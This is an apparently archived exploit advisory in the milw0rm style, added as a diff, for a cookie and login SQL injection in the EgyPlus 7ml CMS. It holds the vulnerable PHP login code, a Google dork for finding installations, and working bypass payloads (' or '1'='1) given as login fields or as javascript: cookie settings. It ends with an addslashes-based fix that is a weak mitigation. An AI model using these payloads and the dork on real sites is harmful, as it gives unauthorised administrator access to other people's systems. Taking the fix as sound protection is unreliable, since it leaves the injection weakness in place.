@@ -1,0 +1,89 @@
+                  ||          ||   | ||
+           o_,_7 _||  . _o_7 _|| q_|_||  o_\\\_,
+          (  :  /    (_)    /           (      .
+
+
+=By: 	Qabandi
+=Email:	iqa[a]hotmail.fr
+
+	From Kuwait, PEACE...
+
+=Vuln:		EgyPlus 7ml <= 1.0.1 - Cookie Auth Bypass SQL injection vulnerability (CABSIV)
+=INFO:		http://egyplus.org/article-2.htm
+=Download:  	http://traidnt.net/vb/attachment.php?attachmentid=252224&d=1211197439
+=DORK:  	"Powered By EgyPlus"
+
+                             _-=/:Conditions:\=-_
+---------------------------------------------------------------------------------
+; Magic quotes for incoming GET/POST/Cookie data.
+magic_quotes_gpc = Off
+--------------------------------------=_=---------------------------------------
+
+                            _-=/:Vulnerable_Code:\=-_
+---------------------------------------------------------------------------------
+./cpanel/login.php::--
+
+if($_COOKIE['username']){
+$username = $_COOKIE['username']; <---- Not filtered
+$password = $_COOKIE['password']; <---- Not filtered
+}else{
+$username = $_POST['username'];   <---- Not filtered
+$password = $_POST['password'];   <---- Not filtered
+}
+
+$sql=$hazemali->query("select name,pass from admin where
+name = '$username' and
+pass = '$password' ");
+
+$AdminInfo=$hazemali->num_rows($sql);
+
+if($AdminInfo==1)  <---- Checks if MySQL statement is true then continues, FAIL...
+{
+---------------------------------------=_=--------------------------------------
+
+                     _-=/:Proof-OF-Concept-or-Whatever:\=-_
+---------------------------------------------------------------------------------
+We have TWO ways to do this:
+
+Login with these:
+
+username: qabandi' or '1'='1
+password: qabandi' or '1'='1
+
+
+or we set cookies (longer version)
+javascript:document.cookie = "username=qabandi' or '1'='1"
+javascript:document.cookie = "password=qabandi' or '1'='1"
+---------------------------------------=_=--------------------------------------
+
+                            _-=/:SOLUTION:\=-_
+---------------------------------------------------------------------------------
+./cpanel/login.php::-- <== Change the code as following;
+
+if($_COOKIE['username']){
+$username = addslashes($_COOKIE['username']); <---- Filter with ADDSLASHES()
+$password = addslashes($_COOKIE['password']); <---- Filter with ADDSLASHES()
+}else{
+$username = addslashes($_POST['username']); <---- Filter with ADDSLASHES()
+$password = addslashes($_POST['password']); <---- Filter with ADDSLASHES()
+}
+
+$sql=$hazemali->query("select name,pass from admin where
+name = '$username' and
+pass = '$password' ");
+
+$AdminInfo=$hazemali->num_rows($sql);
+
+if($AdminInfo==1)
+{
+---------------------------------------=_=--------------------------------------
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-
+-=-=-=-==Bdon-=-za3al=-=-shabab-=-=el-thaghra-=-mafe=--=Mnha=--=-faydeh-==-==-=-
+-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-
+-==-=-=-=-==-=-==-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=---=-==-=-==-=-=-=-=-=-=--
+=-=-=-=-==-=-=-=-=-=-No----More---Private=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-
+Salam to All Muslim Hackers.
+
+# milw0rm.com [2009-06-03]
